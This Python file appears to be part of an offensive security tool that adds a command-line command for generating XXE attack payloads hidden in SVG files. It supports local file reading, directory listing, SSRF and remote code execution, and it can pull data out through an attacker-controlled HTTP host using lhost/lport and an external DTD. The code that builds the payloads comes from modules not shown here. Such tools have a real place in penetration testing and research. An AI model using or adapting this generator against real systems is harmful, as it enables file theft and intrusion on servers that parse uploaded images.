from pathlib import Path

import typer
from typer import Typer

from xeely import console
from xeely.cli import options
from xeely.custom_http.server import HTTPServerParams
from xeely.custom_xml import XML
from xeely.xxe.attack.mode import XXEAttackMode
from xeely.xxe.attack.payload import payload_factory
from xeely.xxe.attack.payload.direct import PLACE_HOLDER

app = Typer()


@app.command()
def svg(
    cdata: bool = options.cdata_option,
    base64: bool = options.base64_option,
    file=options.file_option,
    dir=options.dir_option,
    ssrf=options.ssrf_option,
    rce=options.rce_option,
    out: Path = typer.Option(".", help="The path to the directory where to save the payload"),
    lhost=options.lhost_option,
    lport: int = options.lport_option,
):
    attack_type, resource = options.get_attack_type_and_resource_from_options(file, dir, ssrf, rce)

    raw_svg = f"""
<svg>
{PLACE_HOLDER}
</svg>
    """

    xml = XML.parse_string(raw_svg)

    if lhost != "":
        http_server_params = HTTPServerParams(lhost=lhost, lport=lport)
    else:
        http_server_params = None

    payload_generator = payload_factory.get_payload_generator_for_mode(
        XXEAttackMode.DIRECT,
        base_xml=xml,
        resource=resource,
        attack_type=attack_type,
        should_apply_base64_encoding=base64,
        should_use_cdata=cdata,
        http_server_params=http_server_params,
    )
    payload = payload_generator.generate_payload()

    payload_path = out / "xxe.svg"
    console.print_info(f"Saving payload in {payload_path}")

    with open(payload_path, "w") as file:
        file.write(payload)

    if cdata:
        dtd_path = out / payload_generator.get_dtd_file_name()
        console.print_info(f"Saving DTD file in {dtd_path}")

        with open(dtd_path, "w") as file:
            file.write(payload_generator.get_dtd_content())
        console.print_info("Don't forget to expose an HTTP server for the attack to work.")


@app.command()
def exploit():
    ...
